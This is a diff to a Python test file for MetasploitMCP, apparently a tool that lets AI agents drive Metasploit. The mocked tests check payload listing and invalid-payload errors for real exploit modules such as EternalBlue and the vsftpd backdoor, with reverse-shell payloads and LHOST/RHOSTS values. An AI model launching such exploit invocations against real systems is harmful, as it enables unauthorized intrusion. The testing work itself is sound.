@@ -291,8 +291,8 @@ class TestExploitListingTools:
         # Create mock client
         client = MockMsfRpcClient()
         client.modules.payloads = [
-            'cmd/unix/reverse',
-            'cmd/unix/bind_netcat'
+            'unix/reverse',
+            'unix/bind_netcat'
         ]
         
         mock_module = MockMsfModule('exploit/unix/ftp/vsftpd_234_backdoor')
@@ -302,9 +302,11 @@ class TestExploitListingTools:
             with patch('MetasploitMCP._get_module_object', return_value=mock_module):
                 result = await list_payloads(exploit_module="unix/ftp/vsftpd_234_backdoor")
         
-        # Should fall back to listing all payloads
+        # Should return an error message explaining that the module doesn't support compatible_payloads
         assert isinstance(result, list)
-        assert len(result) == 2
+        assert len(result) == 1
+        assert "doesn't support querying compatible payloads" in result[0]
+        assert "Use list_payloads without exploit_module parameter" in result[0]
 
 
 class TestPayloadGeneration:
@@ -490,20 +492,21 @@ class TestExploitExecution:
         client = MockMsfRpcClient()
         
         with patch('MetasploitMCP.get_msf_client', return_value=client):
-            with patch('MetasploitMCP._execute_module_rpc') as mock_rpc:
-                # Simulate an invalid payload error
-                mock_rpc.return_value = {
-                    "status": "error",
-                    "message": "Invalid payload specified: linux/x86/shell/reverse_tcp. To view compatible payloads for this exploit, use: list_payloads(exploit_module='windows/smb/ms17_010_eternalblue')."
-                }
-                
-                result = await run_exploit(
-                    module_name="windows/smb/ms17_010_eternalblue",
-                    options={"RHOSTS": "192.168.1.1"},
-                    payload_name="linux/x86/shell/reverse_tcp",  # Invalid for Windows exploit
-                    payload_options={"LHOST": "192.168.1.100", "LPORT": 4444},
-                    run_as_job=True
-                )
+            with patch('MetasploitMCP.check_port_available', return_value=(True, None)):
+                with patch('MetasploitMCP._execute_module_rpc') as mock_rpc:
+                    # Simulate an invalid payload error
+                    mock_rpc.return_value = {
+                        "status": "error",
+                        "message": "Invalid payload specified: linux/x86/shell/reverse_tcp. To view compatible payloads for this exploit, use: list_payloads(exploit_module='windows/smb/ms17_010_eternalblue')."
+                    }
+                    
+                    result = await run_exploit(
+                        module_name="windows/smb/ms17_010_eternalblue",
+                        options={"RHOSTS": "192.168.1.1"},
+                        payload_name="linux/x86/shell/reverse_tcp",  # Invalid for Windows exploit
+                        payload_options={"LHOST": "192.168.1.100", "LPORT": 4444},
+                        run_as_job=True
+                    )
         
         assert result["status"] == "error"
         assert "list_payloads" in result["message"]
@@ -516,21 +519,22 @@ class TestExploitExecution:
         client = MockMsfRpcClient()
         
         with patch('MetasploitMCP.get_msf_client', return_value=client):
-            with patch('MetasploitMCP._execute_module_console') as mock_console:
-                # Simulate console output with invalid payload error
-                mock_console.return_value = {
-                    "status": "error",
-                    "message": "Error during setup command 'set PAYLOAD linux/x86/shell/reverse_tcp': [-] Error setting option PAYLOAD\n\nTo view compatible payloads for this exploit, use: list_payloads(exploit_module='windows/smb/ms17_010_eternalblue')",
-                    "module": "exploit/windows/smb/ms17_010_eternalblue"
-                }
-                
-                result = await run_exploit(
-                    module_name="windows/smb/ms17_010_eternalblue",
-                    options={"RHOSTS": "192.168.1.1"},
-                    payload_name="linux/x86/shell/reverse_tcp",
-                    payload_options={"LHOST": "192.168.1.100", "LPORT": 4444},
-                    run_as_job=False  # Console mode
-                )
+            with patch('MetasploitMCP.check_port_available', return_value=(True, None)):
+                with patch('MetasploitMCP._execute_module_console') as mock_console:
+                    # Simulate console output with invalid payload error
+                    mock_console.return_value = {
+                        "status": "error",
+                        "message": "Error during setup command 'set PAYLOAD linux/x86/shell/reverse_tcp': [-] Error setting option PAYLOAD\n\nTo view compatible payloads for this exploit, use: list_payloads(exploit_module='windows/smb/ms17_010_eternalblue')",
+                        "module": "exploit/windows/smb/ms17_010_eternalblue"
+                    }
+                    
+                    result = await run_exploit(
+                        module_name="windows/smb/ms17_010_eternalblue",
+                        options={"RHOSTS": "192.168.1.1"},
+                        payload_name="linux/x86/shell/reverse_tcp",
+                        payload_options={"LHOST": "192.168.1.100", "LPORT": 4444},
+                        run_as_job=False  # Console mode
+                    )
         
         assert result["status"] == "error"
         assert "list_payloads" in result["message"]
